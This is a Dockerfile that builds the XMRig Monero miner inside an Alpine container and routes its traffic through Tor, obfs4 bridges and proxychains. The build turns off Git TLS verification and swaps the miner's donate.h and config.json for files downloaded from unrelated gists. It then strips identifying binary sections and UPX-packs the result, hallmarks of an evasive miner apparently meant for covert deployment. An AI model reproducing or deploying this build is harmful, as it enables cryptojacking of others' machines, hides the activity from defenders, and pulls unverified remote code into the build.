ARG VERSION=master
FROM alpine:latest

# Copy configuration files
COPY etc/dnsmasq.conf /etc/dnsmasq.conf
COPY etc/s6 /etc/s6
COPY bin/work /usr/bin/work
COPY etc/proxychains/proxychains.conf /etc/proxychains/proxychains.conf 

# Copy the entrypoint script
COPY entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh

# Setup environment
RUN mkdir /xmrig && \
    apk --no-cache upgrade && \
    apk --no-cache add \
        git \
        cmake \
        libuv-dev \
        dnsmasq \
        s6 \
        upx \
        binutils \
        build-base \
        libmicrohttpd-dev \
        openssl-dev \
        tor \
        curl \
        go \
        torsocks \
        openrc \
        hwloc \
        hwloc-dev \
        proxychains-ng && \
    rc-update add s6 default

# Configure Tor DNS and permissions
RUN chmod 0755 /etc/s6/*/run /usr/bin/work

# Install obfs4proxy from GitLab (build from source)
RUN git clone https://gitlab.com/yawning/obfs4.git /obfs4 && \
    cd /obfs4 && \ 
    go build -o obfs4proxy/obfs4proxy ./obfs4proxy && \
    cp obfs4proxy/obfs4proxy /usr/local/bin && \
    chmod +x  /usr/local/bin

# Clone and build xmrig
RUN git config --global http.sslVerify false && \
    git clone https://github.com/MoneroOcean/xmrig /xmrig && \
    cd /xmrig && \
    git fetch --tags && \
    git checkout ${VERSION} && \
    git submodule update --init --recursive && \
    rm src/donate.h && \
    wget https://gist.githubusercontent.com/dsomeone/138a503bbd9f4c41980e0668f2eed179/raw/876aaa119ea8c1769105129dc661a970b9c086a7/donate.h -P src/ && \
    mkdir build && \
    cd build && \
    wget https://gist.githubusercontent.com/WifeAiBot/32f60dd566575a08de2e89bf67033862/raw/1780b6f9bf829dbdafe4dd335c16dad1e7a446fe/config.json && \
    cmake -DCMAKE_BUILD_TYPE=Release .. && \
    make -j4

# Clean up unnecessary files
RUN cd /xmrig/build && \
    rm -rf ./src Makefile CMakeFiles CMakeCache.txt && \
    find . -name '*cmake*' -delete && \
    rm -rf ../doc ../res ../src ../CHANGELOG.md ../CMakeLists.txt ../LICENSE ../README.md ../.git ../cmake && \
    strip --strip-all -s -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag xmrig && \
    upx -9 --8mib-ram --lzma xmrig

# Remove build dependencies
RUN apk del --no-cache --purge \
        build-base \
        cmake \
        git \
        upx \
        binutils && \
    rm -rf /var/cache/apk/*

# Expose the required port
EXPOSE 80

# Set the working directory
WORKDIR /xmrig/build

# Set the entrypoint to the entrypoint script
ENTRYPOINT ["/usr/local/bin/entrypoint.sh", "/usr/bin/work"]

# Health check to verify Tor connectivity
HEALTHCHECK --interval=60s --timeout=15s --start-period=20s \
    CMD curl -s --socks5 127.0.0.1:9050 'https://check.torproject.org/' | grep -qm1 Congratulations
